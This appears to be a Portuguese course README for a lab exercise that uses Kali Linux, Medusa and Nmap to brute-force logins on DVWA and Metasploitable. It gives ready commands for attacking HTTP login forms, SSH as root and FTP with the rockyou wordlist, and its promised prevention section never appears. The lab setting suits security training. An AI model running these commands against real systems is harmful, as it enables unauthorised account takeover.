# Desafio-Cybersecurity
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.
-----------------------------------------------------------------------------------------------------
1. *Requisitos do Ambiente*
Kali Linux (máquina virtual ou nativa)

Medusa instalado (sudo apt update && sudo apt install medusa)

DVWA ativo em um servidor ou lab local

Wordlist de senhas (pode ser a default do Kali: /usr/share/wordlists/rockyou.txt)
------------------------------------------------------------------------------------------------------

2. *Identificando o Serviço-Alvo*
Utilize o Nmap para identificar portas e serviços do alvo:

bash
nmap -sV <IP_DO_ALVO>

Exemplo:
(bash
nmap -p 80,443 <IP_DO_ALVO>)
------------------------------------------------------------------------------------------------------
3. *Configurando o DVWA*
   
Certifique-se que o DVWA está executando (localhost ou IP da VM)

Usuário padrão geralmente: admin — senha para teste: password ou conforme configuração
------------------------------------------------------------------------------------------------------
4. *Exemplo de Wordlist*
Você pode criar sua própria wordlist (exemplo: meu_wordlist.txt):

123456
admin
password
senha
Ou usar a wordlist rockyou (descompacte antes, se necessário):

bash
gunzip /usr/share/wordlists/rockyou.txt.gz
------------------------------------------------------------------------------------------------------
5. *Comandos Básicos do Medusa*
   
Ataque a Serviço Web (HTTP Form)
bash
medusa -h <IP_DO_ALVO> -u admin -P /caminho/para/wordlist.txt -M http-form \
-m FORM:/dvwa/login.php:user=^USER^&pass=^PASS^:Login failed
-h: IP do alvo

-u: usuário

-P: caminho da wordlist

-M: módulo (serviço)

-m: parâmetros de formulário:

FORM:/caminho/do/formulario:user=^USER^&pass=^PASS^:mensagem_erro

Exemplo real, ataque a DVWA em localhost:
bash
medusa -h 127.0.0.1 -u admin -P ./meu_wordlist.txt -M http-form \
-m FORM:/dvwa/login.php:username=^USER^&password=^PASS^:Login failed
------------------------------------------------------------------------------------------------------
6. *Ataque a Outros Serviços*
SSH:

bash
medusa -h <IP> -u root -P /caminho/wordlist.txt -M ssh
FTP:

bash
medusa -h <IP> -u ftpuser -P /caminho/wordlist.txt -M ftp
------------------------------------------------------------------------------------------------------
7. *Resultados*
   
Ao ser bem-sucedido, o Medusa exibirá no terminal o usuário e a senha encontrados. Revise todos resultados para garantir se o acesso foi obtido.
